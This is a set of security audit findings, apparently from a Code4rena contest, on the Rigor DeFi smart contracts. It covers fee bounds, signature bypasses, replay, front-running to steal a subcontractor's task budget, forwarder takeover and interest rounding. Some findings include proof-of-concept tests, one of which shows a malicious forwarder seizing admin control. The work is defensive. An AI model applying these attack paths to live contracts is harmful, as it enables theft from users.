# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L392-L394 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L184-L197   # Vulnerability details  # Missing upper limit definition in `replaceLenderFee()` of `HomeFi.sol`  ## Impact The admin of the `HomeFi` contract can set `lenderFee` to greater than 100%, forcing calls to `lendToProject()` to all projects created in the future to revert.  ## Proof of Concept Using the function `replaceLenderFee()`, admins of the `HomeFi` contract can set `lenderFee` to any arbitrary `uint256` value: ```solidity  185:        function replaceLenderFee(uint256 _newLenderFee)  186:            external  187:            override  188:            onlyAdmin  189:        {  190:            // Revert if no change in lender fee  191:            require(lenderFee != _newLenderFee, "HomeFi::!Change");  192:      193:            // Reset variables  194:            lenderFee = _newLenderFee;  195:      196:            emit LenderFeeReplaced(_newLenderFee);  197:        } ```  New projects that are created will then get its `lenderFee` from the `HomeFi` contract. When communities wish to lend to these projects, it calls `lendToProject()`, which has the following calculation: ```solidity  392:        // Calculate lenderFee  393:        uint256 _lenderFee = (_lendingAmount * _projectInstance.lenderFee()) /  394:            (_projectInstance.lenderFee() + 1000); ``` If `lenderFee` a large value, such as `type(uint256).max`, the calculation shown above to overflow. This prevents any community from lending to any new projects.   ## Recommended Mitigation Steps Consider adding a reasonable fee rate bounds checks in the `replaceLenderFee()` function. This would prevent potential griefing and increase the trust of users in the contract.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316   # Vulnerability details  Malicious builder/contractor can change the subcontractor for any task even if all the terms was agreed upon and work was started/finished, but the task wasn't set to completed yet, i.e. it's `SCConfirmed`, `getAlerts(_taskID)[2] == true`. This condition is not checked by inviteSC().  For example, a contractor can create a subcontractor of her own and front run valid setComplete() call with a sequence of `inviteSC(task, own_subcontractor) -> setComplete()` with a signatory from the `own_subcontractor`, stealing the task budget from the subcontractor who did the job. Contractor will not breach any duties with the community as the task will be done, while raiseDispute() will not work for a real subcontractor as the task record will be already changed.  Setting the severity to be high as this creates an attack vector to fully steal task budget from the subcontractor as at the moment of any valid setComplete() call the task budget belongs to subcontractor as the job completion is already verified by all the parties.  ## Proof of Concept  inviteSC() requires either builder or contractor to call for the change and verify nothing else:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316  ```solidity     /// @inheritdoc IProject     function inviteSC(uint256[] calldata _taskList, address[] calldata _scList)         external         override     {         // Revert if sender is neither builder nor contractor.         require(             _msgSender() == builder || _msgSender() == contractor,             "Project::!Builder||!GC"         );          // Revert if taskList array length not equal to scList array length.         uint256 _length = _taskList.length;         require(_length == _scList.length, "Project::Lengths !match");          // Invite subcontractor for each task.         for (uint256 i = 0; i < _length; i++) {             _inviteSC(_taskList[i], _scList[i], false);         }          emit MultipleSCInvited(_taskList, _scList);     } ```  _inviteSC() only checks non-zero address and calls inviteSubcontractor():  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L747-L762  ```solidity     function _inviteSC(         uint256 _taskID,         address _sc,         bool _emitEvent     ) internal {         // Revert if sc to invite is address 0         require(_sc != address(0), "Project::0 address");          // Internal call to tasks invite contractor         tasks[_taskID].inviteSubcontractor(_sc);          // If `_emitEvent` is true (called via changeOrder) then emit event         if (_emitEvent) {             emit SingleSCInvited(_taskID, _sc);         }     } ```  inviteSubcontractor() just sets the new value:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L106-L111  ```solidity     function inviteSubcontractor(Task storage _self, address _sc)         internal         onlyInactive(_self)     {         _self.subcontractor = _sc;     } ```  Task is paid only on completion by setComplete():  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L349-L356  ```solidity         // Mark task as complete. Only works when task is active.         tasks[_taskID].setComplete();          // Transfer funds to subcontractor.         currency.safeTransfer(             tasks[_taskID].subcontractor,             tasks[_taskID].cost         ); ```  This way the absence of `getAlerts(_taskID)[2]` check and checkSignatureTask() call in inviteSC() provides a way for builder or contractor to steal task budget from a subcontractor.   ## Recommended Mitigation Steps  Consider calling checkSignatureTask() when `getAlerts(_taskID)[2]` is true, schematically:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L310-L313  ```solidity         // Invite subcontractor for each task.         for (uint256 i = 0; i < _length; i++) { +           if (getAlerts(_taskList[i])[2]) +               checkSignatureTask(_data_with_scList[i], _signature, _taskList[i]);                     _inviteSC(_taskList[i], _scList[i], false);         } ```  This approach is already implemented in changeOrder() where `_newSC` is a part of hash that has to be signed by all the parties:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L403  ```solidity     function changeOrder(bytes calldata _data, bytes calldata _signature)         external         override         nonReentrant     {         // Decode params from _data         (             uint256 _taskID,             address _newSC,             uint256 _newCost,             address _project         ) = abi.decode(_data, (uint256, address, uint256, address));          // If the sender is disputes contract, then do not check for signatures.         if (_msgSender() != disputes) {             // Check for required signatures.             checkSignatureTask(_data, _signature, _taskID);         } ```  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L477-L481  ```solidity             // If new subcontractor is not zero address.             if (_newSC != address(0)) {                 // Invite the new subcontractor for the task.                 _inviteSC(_taskID, _newSC, true);             } ```  checkSignatureTask() checks all the signatures:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L855-L861  ```solidity             // When builder has not delegated rights to contractor             else {                 // Check for B, SC and GC signatures                 checkSignatureValidity(builder, _hash, _signature, 0);                 checkSignatureValidity(contractor, _hash, _signature, 1);                 checkSignatureValidity(_sc, _hash, _signature, 2);             } ```  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L162   # Vulnerability details  In Project.sol, function `updateProjectHash` L162, `_data` (which is signed by builder and/or contractor) does not contain a reference to the project address. In all other external functions of Project.sol, `_data` contains the address of the project, used in this check:  ```require(_projectAddress == address(this), "Project::!projectAddress");```. The lack of this verification makes it possible to reuse the same `_data`, and the same `_signature` on another project, in the case the latter has the same builder and/or contractor, and the same `_nonce`. In pratice, if the same group of people starts a new project, when `_nonce` reaches the correct value, anyone can change the hash of a task (if we suppose that that `updateTaskHash()` was used in the previous project).
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493-L536   # Vulnerability details   ## Impact In case users are using a contract (like a multisig wallet) to interact with a project, they can't raise a dispute.  The sponsors have added the `approveHash()` function to support users who wish to use contracts as builder/GC/SC. However, the `Project.raiseDispute()` function doesn't check them, meaning if any of those users wish to raise a dispute they can't do it.  ## Proof of Concept I've modified [the following test](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/disputeTests.ts#L179-L215), trying to use an approved hash. The test failed.  ```typescript   it('Builder can raise addTasks() dispute', async () => {       let expected = 2;       const actionValues = [         [exampleHash],         [100000000000],         expected,         projectAddress,       ];       // build and raise dispute transaction       const [encodedData, signature] = await makeDispute(         projectAddress,         0,         1,         actionValues,         signers[0],         '0x4222',       );       const encodedMsgHash = ethers.utils.keccak256(encodedData);       await project.connect(signers[0]).approveHash(encodedMsgHash);       let tx = await project         .connect(signers[1])         .raiseDispute(encodedData, "0x");       // expect event       await expect(tx)         .to.emit(disputesContract, 'DisputeRaised')         .withArgs(1, '0x4222');       // expect dispute raise to store info       const _dispute = await disputesContract.disputes(1);       const decodedAction = abiCoder.decode(types.taskAdd, _dispute.actionData);       expect(_dispute.status).to.be.equal(1);       expect(_dispute.taskID).to.be.equal(0);       expect(decodedAction[0][0]).to.be.equal(exampleHash);       expect(decodedAction[1][0]).to.be.equal(100000000000);       expect(decodedAction[2]).to.be.equal(expected);       expect(decodedAction[3]).to.be.equal(projectAddress);       // expect unchanged number of tasks       let taskCount = await project.taskCount();       expect(taskCount).to.be.equal(expected);     });  ```  ## Recommended Mitigation Steps Make `raiseDispute()` to check for approvedHashes too
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L710   # Vulnerability details  ## Impact  In `Project` contract, the `lendToProject()` function might not be available to be called if there are a lot of Task in `tasks[]` list of project. It means that the project cannot be funded by either builder or community owner.  This can happen because `lendToProject()` used `projectCost()` function. And the loop in `projectCost()` did not have a mechanism to stop, itâ€™s only based on the length `taskCount`, and may take all the gas limit. If the gas limit is reached, this transaction will fail or revert.  Same issue with `toggleLendingNeeded()` function which also call `projectCost()` function.  ## Proof of Concept  Function `projectCost()` did not have a mechanism to stop, only based on the `taskCount`. ```solidity function projectCost() public view override returns (uint256 _cost) {     // Local instance of taskCount. To save gas.     uint256 _length = taskCount;      // Iterate over all tasks to sum their cost     for (uint256 _taskID = 1; _taskID <= _length; _taskID++) {         _cost += tasks[_taskID].cost;     } } ```  There is no limit for builder when [add task](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L248-L257).  And function `lendToProject()` used `projectCost()` to [check the new total lent value](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L199-L202) ```solidity require(     projectCost() >= uint256(_newTotalLent),     "Project::value>required" ); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider keep value of `projectCost()` in a storage variable and update it when a task is added or updated accordingly.  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25   # Vulnerability details  ## Impact  Disputes enable an actor to arbitrate & potentially enforce requested state changes. However, the current implementation does not properly implement authorization, thus anyone is able to create disputes and spam the system with invalid disputes.  ## Proof of Concept  Calling the `Project.raiseDispute` function with an invalid `_signature`, for instance providing a `_signature` with a length of 66 will return `address(0)` as the recovered signer address.  [Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502)  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      ...   } ```  [SignatureDecoder.sol#L25](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25)  ```solidity function recoverKey(   bytes32 messageHash,   bytes memory messageSignatures,   uint256 pos ) internal pure returns (address) {   if (messageSignatures.length % 65 != 0) {       return (address(0));   }    ... } ```  If `_task` is set to `0` and the project does not have a `contractor`, the `require` checks will pass and `IDisputes(disputes).raiseDispute(_data, _signature);` is called. The same applies if a specific `_task` is given and if the task has a `subcontractor`. Then the check will also pass.  [Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L84-L122)  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      // Decode params from _data     (address _project, uint256 _task, , , ) = abi.decode(         _data,         (address, uint256, uint8, bytes, bytes)     );      // Revert if decoded project address does not match this contract. Indicating incorrect _data.     require(_project == address(this), "Project::!projectAddress");      if (_task == 0) {         // Revet if sender is not builder or contractor         require(             signer == builder || signer == contractor, // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass             "Project::!(GC||Builder)"         );     } else {         // Revet if sender is not builder, contractor or task's subcontractor         require(             signer == builder ||                 signer == contractor || // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass                 signer == tasks[_task].subcontractor,             "Project::!(GC||Builder||SC)"         );          if (signer == tasks[_task].subcontractor) {             // If sender is task's subcontractor, revert if invitation is not accepted.             require(getAlerts(_task)[2], "Project::!SCConfirmed");         }     }      // Make a call to Disputes contract raiseDisputes.     IDisputes(disputes).raiseDispute(_data, _signature); // @audit-info Dispute will be created. Anyone can spam the system with fake disputes } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider checking the recovered `signer` address in `Project.raiseDispute` to not equal the zero-address:  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      require(signer != address(0), "Zero-address"); // @audit-info Revert if signer is zero-address      ...   } ``` 
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L187 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L179 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L878 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/libraries/SignatureDecoder.sol#L39   # Vulnerability details  ## Impact There is a `addMember` function in the `Community`.  The function accepts `_data` that should be signed by the `_community.owner` and `_newMemberAddr`.   ```         // Compute hash from bytes         bytes32 _hash = keccak256(_data);          // Decode params from _data         (             uint256 _communityID,             address _newMemberAddr,             bytes memory _messageHash         ) = abi.decode(_data, (uint256, address, bytes));          CommunityStruct storage _community = _communities[_communityID];          // check signatures         checkSignatureValidity(_community.owner, _hash, _signature, 0); // must be community owner         checkSignatureValidity(_newMemberAddr, _hash, _signature, 1); // must be new member ```  The code above shows exactly what the contract logic looks like.   1) `_communityID` is taken from the data provided by user, so it can arbitrarily. Specifically,  community with selected `_communityID` can be not yet created. For instance, it can be equal to the `communityCount + 1`, thus the next created community will have this `_communityID`.   2) `_communities[_communityID]` will store null values for all fields, for a selected `_communityID`. That means, `_community.owner == address(0)`  3) `checkSignatureValidity` with a parameters `address(0), _hash, _signature, 0` will not revert a call if an attacker provide incorrect `_signature`.  let's see the implementation of `checkSignatureValidity`:  ```         // Decode signer         address _recoveredSignature = SignatureDecoder.recoverKey(             _hash,             _signature,             _signatureIndex         );          // Revert if decoded signer does not match expected address         // Or if hash is not approved by the expected address.         require(             _recoveredSignature == _address || approvedHashes[_address][_hash],             "Community::invalid signature"         );          // Delete from approvedHash. So that signature cannot be reused.         delete approvedHashes[_address][_hash]; ```  No restrictions on `_recoveredSignature` or `_address`. Moreover, if `SignatureDecoder.recoverKey` can return zero value, then there will be no revert.   ```        if (messageSignatures.length % 65 != 0) {             return (address(0));         }          uint8 v;         bytes32 r;         bytes32 s;         (v, r, s) = signatureSplit(messageSignatures, pos);          // If the version is correct return the signer address         if (v != 27 && v != 28) {             return (address(0));         } else {             // solium-disable-next-line arg-overflow             return ecrecover(toEthSignedMessageHash(messageHash), v, r, s);         } ```  As we can see bellow, `recoverKey` function can return zero value, if an `ecrecover` return zero value or if `v != 27 || v != 28`. Both cases are completely dependent on the input parameters to the function, namely from `signature` that is provided by attacker.  4) `checkSignatureValidity(_newMemberAddr, _hash, _signature, 1)` will not revert the call if an attacker provide correct signature in the function. It is obviously possible.  All in all, an attacker can add as many members as they want, BEFORE the `community` will be created.   ## Tools Used  ## Recommended Mitigation Steps   1) `checkSignatureValidity`/`recoverKey` should revert the call if an `address == 0`. 2) `addMember` should have a `require(_communityId <= communityCount)`  
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L156-L169 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L199-L208   # Vulnerability details   ## Impact In case where the admin wallet has been hacked, the attacker can drain all funds out of the project within minutes. All the attacker needs is the admin to sign a single meta/normal tx. Even though the likelihood of the admin wallet being hacked might be low, given that the impact is critical - I think this makes it at least a medium bug.   Examples of cases where the attacker can gain access to admin wallet: * The computer which the admins are using has been hacked     * Even if a hardware wallet is used, the attacker can still replace the data sent to the wallet the next time the admin has to sign a tx (whether it's a meta or normal tx) * The website/software where the meta tx data is generated has been hacked and attacker modifies the data for tx * A malicious website tricks the admin into signing a meta tx to replace the admin or forwarder     Since the forwarder has the power to do everything in the system , once an attacker manages to replace it with a malicious forwarder, he can do whatever he wants withing minutes: * The forwarder can replace the admin * The forwarder can drain all funds from all projects by changing the subcontractor and marking tasks as complete, or adding new tasks / changing task cost as needed.  Even when signatures are required, you can bypass it by using the `approveHash` function.  ## Proof of Concept Here's a PoC for taking over and running the `Project.setComplete()` function (I haven't included a whole process of changing SC etc. since that would be too time consuming, but there shouldn't be a difference between functions, all can be impersonated once you control the forwarder).  The PoC was added to [projectTests.ts#L1109](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1109), and is based on the 'should be able to complete a task' test.  ```typescript     it('PoC forwarder overtake', async () => {     const attacker = signers[10];       // deploy the malicious forwarder     const maliciousForwarder = await deploy<MaliciousForwarder>('MaliciousForwarder');     const adminAddress = await homeFiContract.admin();     const adminSigner = getSignerByAddress(signers, adminAddress);     // attacker takes over     await homeFiContract.connect(adminSigner).setTrustedForwarder(maliciousForwarder.address);            // attacker can now replace the admin, so that admin can't set the forwarder back     let { data } = await homeFiContract.populateTransaction.replaceAdmin(       attacker.address     );     let from = adminAddress;     let to = homeFiContract.address;     if (!data) {       throw Error('No data');     }     let tx = await executeMetaTX(from, to, data);      // assert that admin has been replaced by attacker     expect(await homeFiContract.admin()).to.be.eq(attacker.address);      // attacker can now execute setComplete() using the approveHash() method      const taskID = 1;     const _taskCost = 2 * taskCost;     const taskSC = signers[3];     let completeData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     const [encodedData, hash] = await encodeDataAndHash(completeData);     await mockDAIContract.mock.transfer       .withArgs(taskSC.address, _taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), _taskCost / 1e3)       .returns(true);      ({data} = await project.populateTransaction.approveHash(hash));     let contractor = await project.contractor();     let {subcontractor} = await project.getTask(taskID);     let builder = await project.builder();      await executeMetaTX(contractor, project.address, data as string);     await executeMetaTX(subcontractor, project.address, data as string);     await executeMetaTX(builder, project.address, data as string);           tx = await project.setComplete(encodedData, "0x");     await tx.wait();      await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      const { state } = await project.getTask(taskID);     expect(state).to.equal(3);     const getAlerts = await project.getAlerts(taskID);     expect(getAlerts[0]).to.equal(true);     expect(getAlerts[1]).to.equal(true);     expect(getAlerts[2]).to.equal(true);     expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);     expect(await project.changeOrderedTask()).to.deep.equal([]);      async function executeMetaTX(from: string, to: string, data: string ) {       const gasLimit = await ethers.provider.estimateGas({         to,         from,         data,       });       const message = {         from,         to,         value: 0,         gas: gasLimit.toNumber(),         nonce: 0,         data,       };        // @ts-ignore       let tx = await maliciousForwarder.execute(message, "0x");       return tx;     }   });   // ----------------------------------------------------- // // Added to ethersHelpers.ts file: export function encodeDataAndHash(   data: any): string[] {   const encodedData = encodeData(data);   const encodedMsgHash = ethers.utils.keccak256(encodedData);   return [encodedData, encodedMsgHash]; } ```  ## Recommended Mitigation Steps  * Limit `approveHash` to contracts only - I understood from the sponsor that it is used for contracts to sign hashes. So limiting it to contracts only can help prevent stealing funds (from projects that are held by EOA) in case that the forwarder has been compromised (this is effective also in case there's some bug in the forwarder contract).     * Alternately, you can also make it use `msg.sender` instead of `_msgSender()`, this will also have a similar effect (it will allow also EOA to use the function, but not via forwarder).          * The advantage is that not only it wouldn't cost more than now, it'll even save gas.          * Another advantage is that it will also protect projects held by contracts from being impersonated by a malicious forwarder  * Make the process of replacing the forwarder or the admin a 2 step process with a delay between the steps (except for disabling the forwarder, in case the forwarder was hacked). This will give the admin the option to take steps to stop the attack, or at least give the users time to withdraw their money.   ```solidity     /// @inheritdoc IHomeFi     function replaceAdmin(address _newAdmin)         external         override         onlyAdmin         nonZero(_newAdmin)         noChange(admin, _newAdmin)     {         // Replace admin         pendingAdmin = _newAdmin;          adminReplacementTime = block.timestamp + 1 days;         emit AdminReplaceProposed(_newAdmin);     }          /// @inheritdoc IHomeFi     function executeReplaceAdmin()         external         override         onlyAdmin      {         require(adminReplacementTime > 0 && block.timestamp > adminReplacementTime, "HomeFi::adminReplacmantTime");         // Replace admin         admin = pendingAdmin;          emit AdminReplaced(_newAdmin);     }     /// @inheritdoc IHomeFi     function setTrustedForwarder(address _newForwarder)         external         override         onlyAdmin         noChange(trustedForwarder, _newForwarder)     {         // allow disabling the forwarder immediately in case it has been hacked         if(_newForwarder == address(0)){             trustedForwarder = _newForwarder;         }         forwarderSetTime = block.timestamp + 3 days;         pendingTrustedForwarder = _newForwarder;     }      function executeSetTrustedForwarder(address _newForwarder)         external         override         onlyAdmin     {         require(forwarderSetTime > 0 &&  block.timestamp > forwarderSetTime, "HomeFi::forwarderSetTime");         trustedForwarder = pendingTrustedForwarder;     }  ```  * Consider removing the meta tx for `HomeFi` `onlyAdmin` modifier (i.e. usg `msg.sender` instead of `_msgSender()`), given that it's not going to be used that often it may be worth giving up the comfort for hardening security 
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330   # Vulnerability details  ## Impact `setComplete()` function might be called successfully using the past signature when it shouldn't work.  As a result, a task might be completed when a builder doesn't want it.   ## Proof of Concept [approveHash() function](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) can set only true so there is no method to cancel already approved hash without [passing validation here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L891).  So the below scenario would be possible.  - A builder, GC, and SC started a task and SC finished the task. - They are approved to complete the task and signed the signature. - But right before to call [setComplete()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330) using the signature, the SC felt the cost is too low and raised a dispute to change the order using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493). - As I suggested with another medium issue, the task can't be completed when there is an ongoing dispute from [this document - "If there is no ongoing dispute about that project, task status is updated and payment is made."](https://github.com/code-423n4/2022-08-rigor#tasks-completion-and-payment). So `setComplete()` might revert. - Even if it doesn't check active disputes as now, `setComplete()` might revert when the funds haven't been allocated and a builder signed by fault. - After that, the HomeFi admin accepted the dispute, and the cost of the task was increased as SC wanted. - Then the builder would hope to get more results (or scores) from this task as the cost is increased rather than completed right away. - But SC can call `setComplete()` using the previous signature and complete the task without additional work. - A builder might know about that before and try to update task hash but it will revert because SC doesn't agree to [updateTaskHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L283). - In this case, it's logical to cancel the approved hash [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) but there is no such option.   I don't know if there would be similar problems with other functions that use signature and I think it would reduce the risk a little if we add an option to cancel the approved hash.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend modifying [approveHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) like below.  ``` function approveHash(bytes32 _hash, bool _bool) external override { //++++++++++++++++++++     address _sender = _msgSender();     // Allowing anyone to sign, as its hard to add restrictions here.     // Store _hash as signed for sender.     approvedHashes[_sender][_hash] = _bool; //+++++++++++++++++++      emit ApproveHash(_hash, _sender, _bool); //++++++++++++++++++++++ } ```  I am not so sure that a similar scenario would be possible in the [Community contract](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L501) also and recommend to change both functions together.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L903 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L253 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L417   # Vulnerability details  ## Impact The task of zero cost is useless and there would be no subcontractors to accept such task as no payment after finish.  So if such task is added by mistake, it would require more time and effort to finish because builder must complete it by himself to recover tokens.   ## Proof of Concept It will work properly when _amount = 0.  ``` function checkPrecision(uint256 _amount) internal pure {      // Divide and multiply amount with 1000 should be equal to amount.     // This ensures the amount is not too precise.     require(         ((_amount / 1000) * 1000) == _amount,         "Project::Precision>=1000"     ); } ```  ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend changing like below.   ``` function checkPrecision(uint256 _amount) internal pure {      require(_amount > 0, "zero amount");      // Divide and multiply amount with 1000 should be equal to amount.     // This ensures the amount is not too precise.     require(         ((_amount / 1000) * 1000) == _amount,         "Project::Precision>=1000"     ); } ```
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238   # Vulnerability details  ## Impact `addTasks()` function checks [this require()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) to make sure `_taskCount` is correct.  But it might revert when this function is called after a dispute because it takes a certain time to resolve disputes and other tasks might be added meanwhile.   ## Proof of Concept The below scenario would be possible.  - A project contains 10 active tasks(taskCount = 10) and a builder and contractor are going to add one more task. - There were some disagreements between a builder and contractor so they raised a dispute with _taskCount = 10 using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493). - Normally it would take a certain time(like 1 day or more) to resolve the dispute as it must be done by HomeFi owner. - Meanwhile, if the builder and contractor need to add another task, they should set `_taskCount = 10` and `taskCount` will be 11 after addition [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L260). - After that, the HomeFi admin agreed to add a task with `_taskCount = 10`, but it will revert [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238).  So currently, the project builder and contractor shouldn't add new tasks to make their previous dispute valid.  I think it's reasonable to modify that they can add other tasks even though there is an active dispute.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we can modify not to compare [taskCount](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) when it's called from disputes contract.  So we can modify [this part](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) like below.   ``` if (_msgSender() != disputes) {     require(_taskCount == taskCount, "Project::!taskCount"); } else {     _taskCount = taskCount; } ```
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L685-L686   # Vulnerability details  ## Impact Due to arithmetic rounding in `returnToLender()`, a builder can halve the APR paid to a community owner by paying every 1.9999 days. This allows a builder to drastically decrease the amount of interest paid to a community owner, which in turn allows them to advertise very high APR rates to secure funding, most of which they will not pay.  This issue occurs in the calculation of `noOfDays` in `returnToLender()` which calculates the number of days since interest has last been calculated. If a builder repays a very small amount of tokens every 1.9999 days, then the `noOfDays` will be rounded down to `1 days` however `lastTimestamp` is updated to the current timestamp anyway, so the builder essentially accumulates only 1 day of interest after 2 days.  I believe this is high severity because a community owner can have a drastic decrease in interest gained from a loan which counts as lost rewards. Additionally, this problem does not require a malicious builder because if a builder pays at a wrong time, the loaner receives less interest anyway.  ## Proof of Concept 1. A community owner provides a loan of 500_000 tokens to a builder with an APR of 10% (ignoring treasury fees) 2. Therefore, the community owner will expect an interest of 136.9 tokens per day (273.9 per 2 days) 3. A builder repays 0.000001 tokens at `lastTimestamp + 2*86400 - 1` 4. `noOfDays` rounds down to 1 thereby accumulating `500_000 * 100 * 1 / 365000 = 136` tokens for 2 days 5. Therefore, the community owner only receives 5% APR with negligible expenses for the builder ## Tools Used VS Code ## Recommended Mitigation Steps There are two possible mitigations: 1. Add a scalar to `noOfDays` so that any rounding which occurs is negligible i.e. ```solidity         uint256 _noOfDays = (block.timestamp -             _communityProject.lastTimestamp) * SCALAR / 86400; // 24*60*60           /// Interest formula = (principal * APR * days) / (365 * 1000)         // prettier-ignore         uint256 _unclaimedInterest =                  _lentAmount *                 _communities[_communityID].projectDetails[_project].apr *                 _noOfDays /                 365000 /                 SCALAR; ``` 2. Remove the `noOfDays` calculation and calculate interest in one equation which reduces arithmetic rounding ```solidity uint256 _unclaimedInterest =                  _lentAmount *                 _communities[_communityID].projectDetails[_project].apr *                 (block.timestamp -             _communityProject.lastTimestamp) /                 365000 /                 86400; ``` 
